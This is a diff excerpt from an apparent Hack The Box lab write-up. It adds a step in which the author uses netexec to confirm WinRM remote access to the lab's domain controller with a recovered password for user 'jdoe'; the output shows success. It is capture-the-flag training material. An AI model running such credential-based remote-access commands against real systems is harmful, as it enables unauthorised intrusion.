@@ -415,3 +415,16 @@ SMB         10.129.230.179  445    DC-ANALYSIS      [+] analysis.htb\jdoe:7y4Z4^
 
 I now have successful auth as the `jdoe` user
 
+# Winrm access as `jdoe`
+
+```python
+❯❯❯ nxc winrm dc-analysis.analysis.htb -u 'jdoe' -p '7y4Z4^*y9Zzj'
+WINRM       10.129.230.179  5985   DC-ANALYSIS      [*] Windows 10 / Server 2019 Build 17763 (name:DC-ANALYSIS) (domain:analysis.htb) 
+WINRM       10.129.230.179  5985   DC-ANALYSIS      [+] analysis.htb\jdoe:7y4Z4^*y9Zzj (Pwn3d!)
+```
+
+This user can WINRM
+
+```python
+
+```
